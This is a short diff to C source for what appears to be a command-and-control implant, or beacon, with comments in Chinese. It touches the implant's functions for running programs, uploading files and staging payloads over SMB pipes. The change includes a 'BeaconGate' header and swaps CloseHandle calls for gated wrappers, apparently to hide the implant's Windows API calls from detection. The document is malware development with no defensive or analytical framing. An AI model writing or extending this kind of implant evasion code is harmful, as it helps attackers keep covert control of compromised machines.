@@ -1,6 +1,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include "crypto.h" /* rng_get_bytes 收敛到 crypto 层 */
 #include "beacon.h"
 #include "commands.h"
@@ -270,8 +271,8 @@ void execjob_doit(char * runme, DWORD runme_length, DWORD flags) {
 
 	/* 执行它 */
 	if (!execute_program_with_default_ppid(runme, runme_length, &si, &pi, CREATE_NEW_CONSOLE, FALSE)) {
-		CloseHandle(read_stdout);
-		CloseHandle(newstdout);
+		gate_CloseHandle(read_stdout);
+		gate_CloseHandle(newstdout);
 		return;
 	}
 
@@ -369,7 +370,7 @@ void command_upload(char * buffer, int length, char * mode) {
 	WriteFile(outfile, data_buffer(&parser), data_length(&parser), &written, NULL);
 
 	/* 请关闭文件 */
-	CloseHandle(outfile);
+	gate_CloseHandle(outfile);
 
 	/* name 在所有路径上均已释放（原"内存泄漏，糟糕！"注释指向上游旧版行为，
 	   当前代码不存在泄漏，保留说明以免误导）。 */
@@ -501,7 +502,7 @@ void command_stage_payload_smb(char * buffer, int length) {
 
 			FlushFileBuffers(handle);
 			DisconnectNamedPipe(handle);
-			CloseHandle(handle);
+			gate_CloseHandle(handle);
 
 			Sleep(1000);
 			return;
